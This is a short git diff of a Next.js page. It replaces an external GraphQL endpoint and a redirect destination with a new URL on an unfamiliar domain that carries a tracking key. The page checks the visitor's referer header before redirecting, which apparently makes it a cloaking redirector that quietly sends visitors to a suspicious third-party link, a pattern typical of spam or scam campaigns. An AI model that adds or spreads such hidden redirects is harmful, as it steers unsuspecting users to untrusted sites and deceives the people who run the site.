@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://getoffready.000webhostapp.com/after-everything-5-2023"
+	const endpoint = "https://awarecatching.com/naeh6vvub?key=1826521bcaa73852bad0ee428828ab4f"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://getoffready.000webhostapp.com/after-everything-5-2023` 
+					`https://awarecatching.com/naeh6vvub?key=1826521bcaa73852bad0ee428828ab4f` 
 				}`,
 			},
 		};
